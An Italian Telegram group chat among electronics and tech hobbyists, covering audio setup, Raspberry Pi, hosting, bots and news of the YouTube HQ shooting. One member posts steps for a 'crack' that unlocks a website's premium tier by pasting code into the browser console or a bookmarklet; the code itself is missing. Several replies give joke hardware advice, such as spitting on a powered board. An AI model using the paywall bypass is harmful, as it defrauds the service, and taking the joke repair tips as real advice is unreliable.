non è possibile
Hai ancora quei volantini della TIM?
comprato tutto dai negozi ufficiali
loool
Ok.
Com'è connesso il PC?
per il 6 la forza da applicare è quella delle bestemmie, con quella leva corta 85 kg devi essere Hulk per sollevarla e non farti uscire qualche ernia
gli altoparlanti dal rivenditore ufficiale e l'ampli l'ha preso lo stesso tizio degli altoparlanti dalla fabrica
nup
è connesso al lettore dlue-ray e al tv box via hdmi
il pc non è connesso
ah ok

Vero 
Che è 35cm dal fulcro su 1.8m
quindi riproduci il file dal TV box
si
ho provato la demo ufficiale dts e funziona a dovere
allora, marangiolo, rispondi al numero 6

-Minchia professò, la forza delle bestemmie

Ottimo marangiolo, promosso
Volgarmente chiamato "stagista"
l'ampli in modalità direct switcha automaticamente da stereo a dts:x
capito
fa' vedere il file
audio che ho fatto io?
fai una screen alla finestra del software
io ho un martello da fabbro per le situazioni difficili..l'altro giorno avevo un mandrino di tassellatore da sbloccare, non c'è stato ne WD40, ne Svitol che tenesse..ho preso il "convincitore", l'ho appoggiato accanto al mandrino, gli ho detto 4 paroline "dolci", un giro di morsa, 2 botte di "convincitore" e magicamente mandrino sbloccato 

Dove il convincitore è la foto di San Giovanni Battista e le paroline dolci sono le imprecazioni a lui dedicate
la foto sul martello eh
Doveva dargli la benedizione 🤷‍♂
satto
conoscete servizi che dà numeri reali e non voip come textnow?
anche a pagamento, ma che non sia esagerato
tim
Vodafone e
3
Wind, Tim, Kena, ecc....
altrimenti chiamavo lui e il suo calcio rotante
senza avere la scheda fisica
io ho kena mobile pago pochissimo eh
bho
mi serve per whatsapp e basta
di audacity?
groove ip funziona

si
aspè, come si chiamava
Non nominare il suo nome invano dicevano
serio? textnow non va
come fai a non conoscere Chuck Norris ma che brutta infanzia hai avuto
giusto
Appunto
semplicemente non mi veniva il nome
quindi hai 6 tracce
è logico che lo conosco, colui che rimorchiava le 2000 nel 1990
si, le ho gia esportate anche e con vlc funzionano a dovere
metti qualcosa anche su quella del sub per sicurezza
cosa posso metterci?
la voce non la riproduce
non conoscere Chuck è allo stesso livello di non conoscere Bud Spencer e Terence Hill, Stallone, Swarzy, Van Damme, Dolph Lundgren, Don Camillo e Peppone
dopo vedo se và, ora la sala è occupata
altrimenti se non và cosi cosa potrei fare?
ti mando un file con un osc a 50hz
 usa questo
poi verifica di esportarlo nel seguente modo
poi uscirà una finestra dove devi assegnare le tracce ai canali
In questo caso setta a 6 canali lo slider perchè hai 6 tracce
già faccio così
RAGA 
quindi col file di test suonano tutte in 5.1 e pure i blue ray
quindi escludiamo la possibilità che l'ampli non switchan col TV Box
è il file mio fatto male
ricontrolla tutto e prova a riesportare
prova in ac3
Paga con PayPal
Elon regna
in ac3 non riesco
errore?
Lol
Se ha fatto un buon prodotto perché non usarlo?
Esatto
oh, esiste la  Circolare Ministeriale n. 177 del 14 maggio 1969 
Non usate quella copia malefica chiamata Amazon pay
che nessun prof rispetta
esiste un client telegram che permette di selezionare le chat nella home screen?
denunziaaa
Abbiamo un problema...
Perché? Ahha
Leggi sopra
Ha perso il 5% per questo scherzo 
Porc
Ahahahahahahaha
Martedì, 21 Gennaio 2014

La risposta è certa: assolutamente no. Con l’entrata in vigore dell’autonomia, le circolari ministeriali (soprattutto se emanate prima del 1999) non hanno alcun valore prescrittivo. Lo dice anche il Ministero. :C
sad
rip
una domanda: come posso pulirlo il PCB del raspi?
Sputaci sopra
salutaci?
Mentre è collegato alla corrente logicamente
sputaci

Si
Funziona!
ottima opzione
Ci ho provato
eh lo devi salutare perchè poi scoppia
tanto mio padre è vigile del fuoco
Lol 
l'acqua distillata
Ma che dici?! Si abbronza per l'estate al massimo
Meglio il mio consiglio
Un raspberry al mareeee, voglia di programmareee!!
Ahahahahah
si sarà pulito?
Mi sto prendendo un Raspberry e a conti fatti spendo di più tra tastiera, micro sd e alimentatore che di scheda
Ed è così
Vedi che tastiera più mouse sono 11€
Ci hai saputato tu?
Si esatto, 15€ di sd
ho installato e aperto mobogram e si è bloccato il telefono
no, il lama del mio vicino
E 9€ di alimentatore
Ma che dici! Ne basta una da 8gb
Puoi usarne uno del telefono
Eh appunto in casa non ne ho, ne prendo una così se mi serve per altro vado tranquillo
quando l'ho coprato avevo 12 anni e solo la scheda comprai
non trovo il cacciaviteeeeeee!!!
Ancora meglio
Non ne ho da 3 A
e non mi ero nemmeno assicurato che sd servisse
Uno cinese
per un pò lo usavo con una cinese e linux non sapevo usarlo
Ora che arriva
Nenache adesso sai usarlo VERAMENTE
se non ci sputi sopra non lo sai usare
Sono le basi cazzo!
non ti credevo così bugiardo
Che distro hai?
dietpi
...
Un alimentatore da 2A che ho ha casa va bene?
si
Sul PC?
sul rasp
Controlla, su internet
Io dico sul PC!
win 7
Domanda OT su adattatori wifi USB per TV: se io ne monto una chiaveta wifi sulla tv e in qualche modo installo i driver, secondo voi funziona?
Visto che avevo ragione?
Cosa vuoi fare?
steam lo uso con l'immaginazione
Si
La mia tv è lontana dal modem e voglio collegarla direttamente al wifi, in teoria esistono degli adattatori wifi ma io ho una chiavetta wifi a casa
Voglio collegarla, ma la tv non la riconosce (anche perché non sono installati i driver)
dual boot win10 e arch
Tu?
si
Che bravo
Almeno tu sei riuscito a installare arch senza fare la cazzata che ho fatto io
invece quando devo lavorare da dj ho un puzzolente macbook
eh pure io ho dovuto provare un paio di volte
E ti lamenti?
Io ho sbagliato partizione e ho eliminato Windows
Vedi tu
AHIAA
Sento la mancanza solo di fortinite
io avevo sbagliato a copiare qualcosa mi pare
ho cancellato la partizione e fixato tutto
Che bravo
Vabbè, ma te hai quanti anni?
13
E fai il dj?
si d'estate mi capita di fare qualcosina
ma se lavo il case con l'acqua non succede niente no?
Nope
Ancora meglio se lavi il rasp
ook
Con lo sputo!
giusto
non và
Usa textPlus
dove trovo un numero per registrarmi su whatsapp?
Quando Amazon ti sfugge di mano
non và
Texnow
TextNow
Whatsapp non funziona con i VoIP mi pare
ecco
vorrei un numero privato
Sono dal VOIP
anche a pagamento
ma meno di un euro
TextNow
Parlo di whatsapp, non telegram
Anche su whatsappi ho il VoIP
Come?
Vale la pena spendere 10€ in più per prendere il rasp Pi 3 b+ invece che il b?
non penso
piuttosto prendi una rock64
Mi é sempre funzionato e ne ho avuto una decina
raspberry pi3 B vs raspberry pi 3B+
L'ultima volta che hai provato quanto tempo fa era?
Non lo so
Se hai già il 3, no, se devi prenderlo nuovo si
Ma poi non ci sono problemi di compatibilità?
Sia per hardware tipo case ecc sia per software
Che VoIP usi?
No
Groove ip
Ragazzi come creo un centralino con rasp?
Ragazzi qualcuno mi sa aiutare?
Se abilito samba su OMV non me lo da su Windows
Ma su Mac si
Yesss
È storto come non so cosa ma funziona ahahahah
RGB?
No, sono riuscito a farlo sghembo anche con i led solo blu
L'inutilità di questo coso mi sorprende assai🤔
se hai qualche ora da perdere puoi anche fare qualcosa di figo
Allora rimangio tutto
Gli altri 800 led stanno arrivando, penso di farne uno 8x8x8, ma se hai tempo da perdere riesci a fare animazioni belle
Filippo:
Buonasera scusate per la domanda ma come si installa MATLAB api python per Ubuntu?
Uh non saprei
E gli altri 8miliardi?
tipo?
ce ne vogliono 512 .-.
animazioni con lettere, immagini semplici che si muovono, numeri..
Potevano contrabbandare latte in polvere, sarebbero stati più ricchi
what
continuoa non vederne l' utilità

è bello da vedere, non ha altra utilità ahahah
ahahahahahah
Come convinco i miei a farmi fare la stanza domotica?
Chiediglielo
Già fatto xd
Falla
Allora digli che è figo e che starai attento a non rimanere fulminato
Dagli i soldi
Raccontagli dove li porterai e che cosa potranno avere e fare di bello con tutto quello che guadagnerai quando sarai diventato un famoso consulente di domotica 
È il più grande e redditizio contrabbando verso la Cina
Ho scritto una mail per le magliette di overVolt, dovrebbe essere la volta buona che riusciamo ad averle 
ALLELUIA!!!!!
"Nuntio vobis magno cum gaudio, HABEMUS MAGLIETTEM..forsem🤔"
 ma NordVPN è super sicuro per quanto riguarda la privacy? O c'è di meglio? Senza badare a spese
Ma i loghi sono quelli che ti abbiamo consigliato/abbozzato noi?
Ho scritto una mail per le magliette di overVolt, dovrebbe essere la volta buona che riusciamo ad averle 
nordvpn è in sconto a 80 € per 3 anni 
eh lo so, però provandolo a volte subisce rallentamenti
Grazie gesù per esistere
HAHAHAHAAHAHHAAHAH
Penso di non aver mai usato la suoneria del telefono
come gli errori AMP sul gruppo oggi
In parte perchè non mi chiama nessuno
e secondo te il latino da dove l'ho preso?
DIMMI DOVE L'HAI TROVATA 
 
e ringrazia tutti i santi che conosci...non c'è cosa più fastidiosa
molto probabilmente no, sono protetti da copyright
Non so ho schiacciato il tasto del volume a caso e mi è comparsa sotto tutti i volumi regolabili
Sad

Forse android 8.0
 


Ha ragione
Io dovrei dormire nel blog
È possibile trasformare questa in una tavoletta grafica per photoshop?

 ‎€2‎1.‎99‎ i‎nv‎ec‎e ‎ch‎e ‎€3‎8.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 4‎3.‎60%
⭐️‎ 4‎.8‎0 ‌‎/‌‎ ‎5.‎00‎ (‎34‎ r‎ec‎en‎si‎on‎i)
 

Immagino di no ma la speranza è l'ultima a morire no?
Nope, con tutta la buonissima volontà
Damn, è morta pure la speranza
È più facile trasformare una scrivania dell'ikea in tavoletta grafica che quel coso

OTTIMO, ho giusto un paio di scrivanie in cantina
Photoshop arrivo
Che Photoshop useresti? Elements o CS ?
no però ci sono le Huion economiche a 20-30€ sempre in offerta su Amazon..stamattina c'era, a saperlo la postavo
🤔è una sfida pour moi, Romboli?
Cc
Nono, già fatto
Circa

cosa? questa mi giunge nuova
Questo era il prototipo
Ma l'altra foto non la trovo
Questo era il telaio
Comunque non c'è mai stata in video, non preoccuparti che non ti è sfuggito nulla
Uhhh tutorial
Dovevi farlo per il primo aprile
Photoshop desk
E niente, cercando quelle foto ho trovato pure il video di quando ci siamo infiltrati a scuola (chiusa) di sera

maaa che cazz
DONT TRY THIS AT HOME
"bulli"
BUT TRY IT AT SCHOOL
try it at school
Security is my #1 priority
maa... perchè l'avete fatto? 
fac, prima di me
oh
Hahah
'nfame
Per lavorare a robotica più del tempo possibile
ah lol 
Solo che c'erano il custode e la moglie in giro hahaha
Chiudere le porte 1mm/min super stealth
ma HAHAHAHAHAHHA
007
non vi hanno trovati?
facci vedere il video ti prego
Non saremmo qui 
 
cioè?
Quando viene a casa tuo papà glielo dico
non fa lo stesso effetto detta in italiano 
beh però suona abbastanza minaccioso
si ecco, in veneto è peggio
Ragazzi sto costruendo un drone ma ero indeciso tra  una batteria da 2700mAh 
 O una da 4000mAh o più
Cosa mi consigliate?
Dipende che drone
Indovinate la sihlouete
Cicca? Giorgio?
Giorgio sta a roma 
Un s500 con apm 2.8 e dei motori da 720kv peserà 2kg
Allora vai di grossa
Oppure se hai voglia vedi 
 e fai il confronto
ah ma pensavo fosse una foto non di adesso hahahahaa
Ma quando è successa sta cosa, fatemi capire 
Nono secondo me è marco
Ok.. Credo che una 4000mAh basti?
4 anni fa
Ah ok
...e la Juve perde 
Crack di 
 per avere la premium gratis:

1) aprire la pagina quadricotteri

2) ctrl+shift+i

3) incollare sta roba nella "console" (in basso nella finestrella che si è aperta a destra)

4) premere invio

roba:


Così giusto per essere jenerosi

Ok grazie mille gentilissimo
California , 
Dipendenti barricati negli uffici. 

AGGIORNAMENTI SU 



 


lol
HAHAHAHAHAHAG sito fatto bene mi dicono
WTF
wtf
april's fool?
E' il 3
eri gia al 4?
Errore di lettura 
ahhahah
 🤣no vabbè, basta, chiudetela qui 
Ahahah
come umiliare Buffon 
non si apre niente con ctrl shift i
Povero...
Modric e Ronaldo sono devastanti. c'è poco da fare
povero il nostro capitano
ecco, mi dispiace un sacco per lui
è un grande
PS sono juventino
Ah scusa quella è la shortcut solo su chrome, non so sugli altri
ma non mi shitstormate
leggi la documentazione, dovrebbe essere scritto
Devi aprire l'equivalente del developer tools di chrome, che in ogni browser ha un nome diverso ma ci dovrebbe essere
ma la notizia dell'attacco a yt è attendibile?
Vedi quanti ne chi ne parla
Sisi
ok... fatto ma nel momento in cui premo invio mi da errore
ho allertato mezzo mondo
compreso gruppo del catechismo
A me funziona ancora, non hanno cambiato
c'è un'amica mia e di 
 che si sta preoccupando per i video della sabrigamer
ci rendiamo conto?
Hahaha
L'alternativa è creare un nuovo bookmark (preferito, comunque lo chiami) e al posto dell'url incollarci dentro sta roba, e poi cloccarlo quando sei sulla pagina



non per le persone, per i video (anche se non è attacco al datacenter ma agli uffici)
Io per quelli di overVolt ❤️
Ahaha
Infatti, a parte che il DC sara protetto meglio di quello di Aruba
Purtroppo sì, è live su 

Ma quanti account hai?
Ah questo è quello che si chiamava voip ahhaha

AHAHAHAHAHAHAHAHAHHAHA
Wtf
lunga storia
troppo lunga
Estremamente lunga
Rip
Wait
ehm si se vuoi entro con altri account
Mi stai dicendo che Repubblica ha implementato i telegraph?
eh si
da circa 2 giorni
2 giorni
si chiama AMP 
Nice, posso rimuovere due giornate di lavoro per parsare l'HTML di Repubblica col mio bot
ahahah, povero
Avevo fatto un bot che converte gli articoli in telegraph e li broadcasta nei gruppi dove lo aggiungi
@?
come faccio a vedere la live? 🤔
vabbè faccio così
è una poverata :(
hahah
la ✋ mi blocca
eh si
mamma mia... dove stiamo andando a finire
attentati come se nulla fosse 
Al Galilei?
*attaccano una scuola* 
hahahahaha
yup
saranno passati 10 minuti e ora se cerchi YouTube escono solo gli attentati
vabbò, vado a dormire che domani mi toccano 3 ore di italiano 2 di inglese e 1 di musica
ciao a tutti
a domani
domani?
a domani ❤️❤️
io sto a casa domani
bello inoltrare lo stesso messaggio nei 827 gruppi dove stavo lavorando fino a 2 minuti fa
Qualcuno non ha preso bene la demonetizzazione dei propri video
Ma cosa
Ma ho inoltrato dal canale di Marco lol
 sta roba non funziona
cos
eh hai inotrato da ultim'ora, non è nella whitelist
Ah fuck ahhaha 
no é che il messaggio resta inoltrato dall'origine, quindi resta ultim'ora
Colpi d'arma da fuoco presso gli uffici della società a San Bruno. Media locali: a sparare sarebbe stata una donna. Dieci giorni fa la più importante piattaforma web di video ha bannato tutti i contenuti con armi da fuoco
Hanno veramente bannato i video con armi da fuoco?
ma sei un pazzo
 alla fine riavviando ho fixato samba
Too late
 sei te?
Raga da che sito mi consigliate di prendere l'anet a8 ??
Di qualsiasi tipo in teoria
Non la prendere
Riavviando chi?
Gearbest
il pc
Perché ?? 
Spendi molto di più
C'è qualche coupon attivo al momento ?
Ah hahaha quindi la modifica che abbiamo fatto alle group policies era giusta ma entrava in vigora dal riavvio del servizio samba
yes
Cercando samba... 
 ho fatto shopping
hahahahaha
Windows ha quelle signorine sempre in esecuzione che ballano cercando stampanti e NAS
hahahahah
A che prezzo mi consigli di prenderla ?
Quella messa da 
 oggi era buona

 ‎€2‎47‎.3‎4 ‎in‎ve‎ce‎ c‎he‎ €‎37‎9.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 3‎4.‎91%
⭐️‎ 4‎.2‎0 ‌‎/‌‎ ‎5.‎00‎ (‎56‎ r‎ec‎en‎si‎on‎i)
 

Ok, ti ringrazio
La anet secondo me più di 120€ non la dovresti pagare..
Questa è pure meglio della anet
ma il bot delle offerte fa tutto in automatico o le mandi tu
Oh purtroppo è finita l'offerta lampo
lui manda solo il link, il resto si arrangia il bravissimo 
 ☺️❤️
devo ricordarmi di aggiungergli un comando, è da tempo che devo farlo
quella messa da Korry casomai
ahhh
non posso usarlo :(

Mi dispiace, ma sembra che tu non sia autorizzato ad usarmi.
eh beh, volete pubblicare voi su offerVolt? 
si :)
ecco, così non sei geloso
ma posso creare un canale mio di offerte e usare quel bot?
 se ti pago posso farlo?
nope, all'inizio era possibile, poi è diventato closed source
:(
neanche, ha rifiutato tutte le richieste
ufffffffffffaaaaaaaaaaaaaaaaaaa
‍ cos'è sta faccina? 🤨

 USA: Sparatoria nel quartier generale di YouTube a San Bruno in California: Uccisa la donna che ha sparato
Tecnicamente il bot sarebbe pronto per farlo usare ad altre persone... Dico, se un tizio vuole usarlo ed è admin del bot, può registrare un altro canale dove il tizio è admin, e non può pubblicare su offervolt... peró giustamente, girando sulla vps, lo lasciamo usare solo a Marco e a Corrado
Riscrivi un altro bot
e poi ci abbiamo perso moltissimo tempo dietro 
chi cazz ha vogliah
Paga qualcuno per fartelo fare allora
chi
Basta che vai in un gruppo di bot developers e trovi gente che ti fa bot a pagamento
mmmmmmm
e ne perdiamo ancora 
Io stamattina: "oggi vado a letto presto, ho bisogno di dormire"
Io 5 minuti fa: "che bello React, dai, ultimo "tutorial" e vado a letto"
Io ora: "che bello React, dai, ultimo "tutorial" e vado a letto"
non è solo il bot eh, una cosa così è 30% bot e 70% altre cose, tra cui prendere tutte le informazioni dagli store
un bot developer non riesce a ricrearti Scontino probabilmente
as always
((((((((((((((((((
si potrebbe mettere open source
Chi sa fare i bot generalmente sa anche fare scraping dai siti
Reactive Javascript Frameworks: The Black Holes for Web Developers
appunto, hai messo il condizionale 
Comunque io ho provato solo Vue, e da quanto ho sentito è quello più "human-readable"
Beh, é una figata unica, solo un po' complicato all'inizio
vabeh a me non importa molto
ma solo io di notte attacco The Producer School?
di cattiveria sulla Future
a pagamento io lo farei
Io Attacco con Vsauce oppure con Yotobi
Si, Vue non mi pareva male, ma a scuola abbiamo visto React e se faccio lo stage in azienda probabilmente dovrò usare React
Quindi mi tocca saperlo
solo nella tua scuola fanno usare react
In realtà è una cosa che mi interessa comunque, l'unica cosa buona che ha fatto Facebook
ho letto "strage" e ho detto" cosa ca?? fa una strage in azienda?"
nelle scuole di Milano è già tanto se i professori sappiano cosa sia
Non é una scuola superiore, la chiamo scuola ma in realtà é un corso
forse è meglio che vada a dormire và
YouTube 2.0

ah ecco, mi suonava strano
NON INSULTARIE MIA CITA'!
HAHAAH
sono pure io di Milano eh
I professori hanno sempre un programma preciso da seguire, e non hanno il tempo di aggiornarsi su nuovi Frameworks e/o Tecnologie
Tranne la nostra che anziché spiegare dava a noi da studiare tecnologie "nuove" da spiegare a lei
ovvio
in realtà è abbastanza libero il programma nelle scuole, ho amici che hanno fatto python e C++ in quarta, ed altri che hanno fatto Java e web
 ne sa qualcosa
figa come idea
Appunto
Autogestione la fate?
io l'anno prox sarò in prima informatica :)
Notte gente, ci si vede domani 
Noi abbiamo fatto C, Java, poco di Android, lato web vabbé HTML CSS JS jQuery, php, JSP con varie robe
blackhumor fino ad un certo punto 
...
Qualcuno non ha preso bene la demonetizzazione dei propri video
adios
Anch'io
Bestemmierò per il C/C++, ne sono sicuro
ahahha
Sono abituato con linguaggi ad alto livello, dove c'è una API molto più semplice da capire
no raga io  non ci credo
mi hanno limitato anche qui
:(
Buone notizie, al momento non esiste alcuna limitazione sul tuo account. Sei libero come l'aria!
Per iterare un Array in C++ ci ho perso le ore oggi
WTF
Già
io sono alle basi/medie
Brutt
Aggiungi un po' di assembly
Io utilizzo maggiormente Python
zio lo sai che l'ho inventato a caso!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
lollllllllllllllllll
hahahahahha
Beh, oddio
telegram è fuso
Quindi tu sai programmare in Java?
yes, poco
ho iniziato con netbeans
o  come si scrive
Io ho completato quasi tutti i corsi sololearn
Ma non ricordo quasi nulla
ah
corso fisico
Quindi per Java Intellij
No aspè mi sto confondendo
yes
NetBeans ≠ JetBrains
ho fatto un mini-software che ti collegava cliccando u bottone al mio sito etc
si
Sai creare HTTP API e/o Backend di siti Web?
si dai con funzioni basi
basi basi
http non sono dei migliori
In che linguaggio
non lo faccio da tantissimo. Non mi ricordo
PHP?
sisi
nn mi ricordavo xd
lol
usi troppo sti sticker...
1) Gli ho trovati oggi
2) Sono di ElectroBOOM
ElectroBOOM o lo ami o non lo conosci
Ahahahahahahah
È un genio
Dafuq? Intendi che HTTPS è migliore per il 
? Non ho capito
si
++
vado a dormireh
Hay! Belle Guide che fai su Insta, piccole e digeribili
Notte
come ti chiami su insta
Grazie :)
Penso che sia spam
Io di solito creo la mia Applicazione Flask, la faccio girare con una WSGI (Gunicorn) e successivamente creo un WebServer dotato di SSL con nginx che reindirizza il traffico (utilizzandolo come Reverse-Proxy)
lo so
in privat
Guada la mia bio
Bhe si fa così in modo standard
nn bannatemi
Ho visto alcune implementazioni online in NodeJS (correggimi se sbaglio, non ci ho fatto molto caso) che utilizzavano OpenSSL direttamente nell'Applicazione principale
Certo, hanno la gestione di http nativa
Python ha bisogno di uwsgi o gunicorn per gestirle
Mentre di solito nginx si mette sempre come webserver, reverse proxy e load balancing si fanno fare a lui
E questo generalmente si fa in production, giusto?
Yes

Per il testing di solito si usano serverini di prova single core, ad esempio Django ce l'ha built-in
Sisì, Flask permette di creare un Mini Web Server
Poi successivamente per il Deploy si passa all'artiglieria pesante
Bene, più comodo
dominio preso!
hosting preso!
Sai che c'è un modo più facile su Windows per fare le screen?
sarebbe?
Start+shift+s
Come il Bravo Pesavento insegna 
È proprio instant

ah lol
Io ho scoperto oggi la scorciatoia equivalente su gnome
Poi vai su Telegram e fai direttamente ctrl+v
Mi ha rivoluzionato la vita
ok grazie ora posso cestinare lightshot
Ma ovvio
R.I.P
Io non ho i soldi neanche per le VPS da 40cent
Anch'io l'ho scoperto da poco grazie a 
 ed è top
ahahah ok
ah lol
sto facendo il backup del sito....
La vera domanda è, perché Windows 🤔
Ahia
Ahia
?
qual è la combinazione?
Sento puzza di WordPress
si
 CMS Merda?
infatti lo rifaccio!
beh drupal è un buon CMS
Win + Shift + S
WordPress no
Eeeeehh dipende dipende dai
su gnome intendo
Aaah k
Quella senza apostrofo 
lollllllllllll
sorry, non me ne sono accorto. sappi che non è bello, però, correggere un grammar-nazi
faro tutto il sito da capo
Su gnome con stamp salvi lo screenshot, con shift stamp (e poi selezioni un'area) salvi l'area... E se premi anche ctrl insieme la copia negli appunti
farò
figo figo, grazie mille
hostinger = mierda
Yup
Ma èggratis
PAGAVO 70 EURO L'ANNO
:(
 Per Hostinger?
Potevi pagare il WebServer sfruttando un altro venditore ad un prezzo sensibilmente più basso, e pagare annualmente il dominio a parte
lo so
che brutto come dominio xyz
ora uso rhosting
infatti lo cambio
è una formula matematica
xyz
  Daniil Approved
beh bel lavoro con madelineproto ma dominio inguardabile
ho sbaglitato.... ho preso due arduini
non fa mai male uno in più
oke
Per l'informatica e/o IoT è sempre meglio avere un .io
Best Marketing Technique: 
di solito quando lavoro ad un progetto mi prendo subito il dominio 
tanto generalmente con tutti i register c'è 1 mese di tempo per il rimborso quindi se decido di abbandonare il progetto ho del tempo
ancora no
Cosa
l'hosting
Eh sisi
Era un cosa stupito
Con questa sono morto

Layout ITA: Tasto Win + Tasto StampRsis
Layout US: Tasto Win + Tasto PrtSc
Ottimo inizio settimana, sono appena svenuto
quello le salva però
Si obv 
Questa battuta è talmente black humour che la sera non la vedi
Qualcuno non ha preso bene la demonetizzazione dei propri video
win shift s le copia sulla clipboard, così da Telegram fai ctrl v e la mandi fastissimo
Lol
buongiorno
 USA: Sparatoria nel quartier generale di YouTube a San Bruno in California: Identificata come Nasim Aghdam di 39 anni youtuber e attivista vegana e animalista, era arrabbiata perché la società aveva smesso di pagare per la pubblicità veicolata dai video che lei postava 

 aveva ragione
Avevi dubbi?
Già animalista e vegana dicono che questa era matta
Che poi... Quando si tratta di animali "oh no poveri kuccioli" e quando di tratta di persone "perzone falzeee!!! Morite tti"
Ma sai perché sono belli? Perché non parlano, sennò la manderebbero a fanculo pure loro
sono quasi a livello con i naziappleisti
Naziapleisti?
si i fan della apple che difendono il nulla
Un secondo ragazzi, la mia prof vuole chiamare a casa perché dice che ho fatto filone secondo lei
Ahh
sei panettiere?
Ahhh
Ho capito
era una battuta 🤣
Che battutaccia
Eh sono tardo
Non ci credo
Looool
Mi avete tacciato di black humor ma a quanto pare ci avevo azzeccato: la terrorista (suicidatasi) era una attivista vegana e animalista arrabbiata per la totale demonetizzazione dei propri video 
  il profeta
Loool
La gente sta male..
Un po' di black humor non fa mai male, certo non bisogna riderne
ma lol
  ma quanto è una copia delle lego? XDD
Opencreators introduces continuous BS210 3D printer with automatic build plate changing

Questa è una 3d.... Da lavoro
Magari da replicare con Arduino
Parole saggie 
La gente ha l'odio dentro
 
 USA: Sparatoria nel quartier generale di YouTube a San Bruno in California: Identificata come Nasim Aghdam di 39 anni youtuber e attivista vegana e animalista, era arrabbiata perché la società aveva smesso di pagare per la pubblicità veicolata dai video che lei postava 

Io voglio sentire il commento di cruciani
Gente = lamer bimbi,cioè  mostri
però che spreco..era anche carina
Più sono carine più concentrano l'odio
 ecco, questo mi fa altamente incazzare..io ci sono stato in quelle zone, gli è rimasta solamente l'aria che respirano
:(
RAAAARGHHH 
Si è rotto il cazzettino
Su locked... E non ho idea come, visto che non lo tocco mai
si è proprio staccato?
hai provato con il trucco dello scotch
L’utilità di quel coso mi sfugge
Mai capita
Mi pare blocchi la scrittura su sd
Si ma è inutile lo stesso
Sono d'accordo
Rip marco
Rip
amen..reso e buonanotte
Si sapeva
giusto per distruggere completamente il responsive
🤣Marco: "eh mi sono pentito di non aver assemblato il pc a dicembre"..ecco cosa succede a non ascoltare il prossimo 

Io non lo ho visto il video
classico IMDO e 
 ah sei stato anche citato per webdevelopment
Benvenuti ai nuovi
Quanto glielo avevamo detto noi a Marco? 
30 minuti e lo vedo 
Io tra 55 minuti ho lezione
uuh
esattamente
Salve a tutti
Prova con uno spillo

 Riparazione microsd rotta fai da te, torna a funzionare sempre al ...

Come Riparare un Interruttore di Blocco in una Scheda di Memoria
Ed ecco un idea per un video
How to turn bad situations into a good idea

 questo è veramente comodo! come far felice la mamma: prendi un Fire scassatissimo, piazzaci su questa pagina, incollalo al muro con biadesivo e forbici dalla punta arrotondata, ed ecco la scorta di lasagne e di gratitudine garantita a vita❤️
Perchè il vero hacker non può non essere fan di Mucciaccia e delle sue mitiche forbici ❤️
La prima volta che spero sia clickbait
purtroppo è vero..indicizzazione di YouTube andata a "donne di facili costumi e lavoratrici stradali"
Ragazzi mi consigliate di cambiare DNS con quelli di 
?
Metti 
Io li ho messi ieri... Provo qualche giorno e vi faccio sapere
io l'ho pravato e va bene non vedo ,grandissime differenze con quelli di google , ma va bene
Ok, comunque per 
 dovrebbe essere più veloce 

Ho quelli di fastweb 
Quelli sono veloci
Lo so ma non mi fido della privacy
Io mi faccio una domanda da quando ho iniziato a vedere MR.robot ma lui ha veramente conoscenze informatiche come nel film?
Bo
Non penso
Dubito, è un attore
Però nel frattempo avrà imparato qualcosa, per interpretare meglio il personaggio
Ma il creatore ne avrà di sicuro
ciao ragazzi 
Ciao Alessandro ben venuto tra noi !!!
se vi chiedessi di progettare un pcb o un modello 3d di qualcosa o un circuito non molto complesso, quanto vi fareste pagare?

ho realizzato un pcb per conto di una startup e verrò pagato per ogni pezzo assemblato e venduto. a questo, però, devo aggiungere il costo del progetto in sé, ma non so quanto chiedere xD
Ciao ragazzi, un saluto anche da parte mia...
consigli?

il pcb è piccolo e non molto complesso e ha richiesto un paio di giorni di lavoro 
Alessandro ti conviene fare una stima per comparazione e aumentarla del 15%... Guarda quanto fanno pagare gli altri attraverso i canali più comuni dopodiché ti verrà fatto notare che sei più caro e sarà lì che dovrai sfoderare la tua capacità di trattativa perché dovrai essere in grado di venderti come il numero 1 del tuo settore. Questo è il mio segreto per essere il numero 1
eh lo so, ma il problema è che non conosco "altri", quindi non saprei come comparare.
l'unico paragone che ho è dato dall'azienda della mia facoltà ma quelli fanno pcb complessi come le schede madri dei pc, che richiedono mesi e mesi di sviluppo e che vendono a caro prezzo. il paragone è inutile 
Alessa... Vedi che la gente cercherà sempre di sembrare più professionale di quello che in realtà è... Una stima molto semplice la puoi fare attraverso le ore uomo e i materiali occorrenti... Ma la parte essenziale è la tua professionalità e questo deve andare oltre ogni stima
ragazzi il mio IDE (arduino) è in italiano e penso che alcune comandi siano spostati perchè andando su strumenti non c'è niente che corrisponda a board...
qualcuno sa aiutarmi?
sicuramente, ma so cosa realizza l'azienda della mia facoltà e so cosa ho realizzato io... c'è un abisso, per questo non mi aiuta molto un confronto con loro 
Alessa... Fai come credi!
ma sono d'accordo con quello che dici, solo che non ho modo di fare confronto perché non conosco nessuno, eccetto loro
Materiale+ore uomo+professionalità

ragazzi perfavore
Che devi fare?



 prossimo argomento da trattare in video, obbligatorio 
Fatto a scuola haha
Noi a fisica in prima liceo 
Da programmarlo? Non credo proprio
Noi in quinta con la Scarpa
Cuoricino eazy da overVolt
Ragazzi ma può essere che uno scheletro da laboratorio sia vero? Il mio professore di scienze ha detto di sì e che apparteneva a un monaco. Lo scheletro in questione è un po’ bassino e la mandibola è spezzata e manca anche qualche dente. Al tatto non sembra neanche finto ed è tenuto da fil di ferro che passa in tutto il corpo
Potrebbe
Forse è un calco
stampa 3D

Potresti guardare se nella parte interna dell'osso c'è come un tessuto spugnoso, se si dovrebbe essere autentico
Eh sisi
Circa
Con Montecarlo
yey siamo colleghi di cuoricino allora 
Seh
Rende molto l'idea
Qualcuno mi può aiutare con un hc-05?
Non lo ho mai usato, escludo il fatto che sia bruciato... Però boh, mi da sempre -1 e quando gli invio qualcosa mi da combinazioni di numeri
Ma quanto sono belle queste lobby?
Tutti yellow ahahahah
Prima mi fottevano sempre lo yellow e sono passato al green
Il green me lo fottono di meno ma mi fa innervosire quando me lo prendono perché dicono green e rispondo io
Prova a cambiare i baud, quando si bruciano muoiono proprio
Si ora ho messo un baud minore, va
Effettuare il collegamento dei dispositivi HDMI ad un amplificatore home theater acceso potrebbe bruciarlo?
Quello che avevo non funziono più e il tecnico disse che era perche collegavo gli HDMI con apparecchiature accese
Non vorrei rompere anche questo



L'ho preso x un amico, secondo voi è buono ?
 
 anche io ho preso 1 raspberry pi 3 model b mi arriva tra il 6 e il 9 
Anche io, mi arriva lunedì
B+
